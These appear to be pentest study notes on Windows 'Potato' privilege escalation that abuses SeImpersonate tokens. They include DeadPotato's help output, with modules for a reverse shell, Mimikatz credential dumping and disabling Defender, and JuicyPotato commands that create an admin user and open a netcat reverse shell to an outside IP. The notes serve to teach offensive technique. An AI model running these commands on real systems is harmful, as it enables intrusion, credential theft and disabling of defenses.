

# DeadPotato 



https://github.com/lypd0/DeadPotato


```
C:\Users\lypd0> GodPotato.exe
  
    ⠀⢀⣠⣤⣤⣄⡀⠀    _           _
    ⣴⣿⣿⣿⣿⣿⣿⣦   | \ _  _  _||_) _ _|_ _ _|_ _
    ⣿⣿⣿⣿⣿⣿⣿⣿   |_/(/_(_|(_||  (_) |_(_| |_(_)
    ⣇⠈⠉⡿⢿⠉⠁⢸   Open Source @ github.com/lypd0
    ⠙⠛⢻⣷⣾⡟⠛⠋         -= Version: 1.2 =-
        ⠈⠁⠀⠀⠀

_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

 (*) Example Usage(s):

   -={ deadpotato.exe -MODULE [ARGUMENTS] }=-

   -> deadpotato.exe -cmd "whoami"
   -> deadpotato.exe -rev 192.168.10.30:9001
   -> deadpotato.exe -exe paylod.exe
   -> deadpotato.exe -newadmin lypd0:DeadPotatoRocks1
   -> deadpotato.exe -shell
   -> deadpotato.exe -mimi sam
   -> deadpotato.exe -defender off
   -> deadpotato.exe -sharphound

 (*) Available Modules:

   - cmd: Execute a command as NT AUTHORITY\SYSTEM.
   - rev: Attempts to establish a reverse shell connection to the provided host
   - exe: Execute a program with NT AUTHORITY\SYSTEM privileges (Does not support interactivity).
   - newadmin: Create a new administrator user on the local system.
   - shell: Manages to achieve a semi-interactive shell (NOTE: Very bad OpSec!)
   - mimi: Attempts to dump SAM/LSA/SECRETS with Mimikatz. (NOTE: This will write mimikatz to disk!)
   - defender: Either enables or disables Windows Defender's real-time protection.
   - sharphound: Attempts to collect domain data for BloodHound.
```






















TLDR;

in windows every process has a token that has information about the account that is running it. they arent secure since theyre just locations within memory that could be brute-forced by users that cant read memory. to use the token though you'd need SeImpersonate privilege. Its usually only given to administrator accounts.

This is used by legitimate programs as they might need to use another programs tokens. this is to escalate from administrator to local system which has more privileges. This is usually done using a call to winlogon to get a system token and simply executing itself witht hat system token and then placing it in the system space. The potato attack tricks a process running as system to connect to their process which hands over the token that can be used.

[[1 SeImpersonate and SeAssignPrimaryToken]]



```
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net user sawyer Password123 /add" -t *
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net localgroup administrators sawyer /add" -t *
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.99 8443 -e cmd.exe" -t *
```













---


Every process has a token that has information about the account that is running it,

these tokens are not considered secure resources they are just locations within memory that could be bruteforced by users that cannot read memory, to utilize them SeImpersonate priv is needed.

legitimate programs may use this privilege when seeing an application that runs in the context of a service account (For example uploading a web shell to an ASP.NET web application achieving remote code execution through Jenkins, or by executing MSSQL queries)

Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. Attackers often abuse this privilege in the "Potato style" privescs - where a service account can `SeImpersonate`, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.


## PrintSpoofer and RoguePotato

JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

#### Escalating Privileges using PrintSpoofer

Let's try this out using the `PrintSpoofer` tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command. Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).




things to try 

- juicypotato
- printspoofer
- roguepotato
- **godpotato**
- genericPotato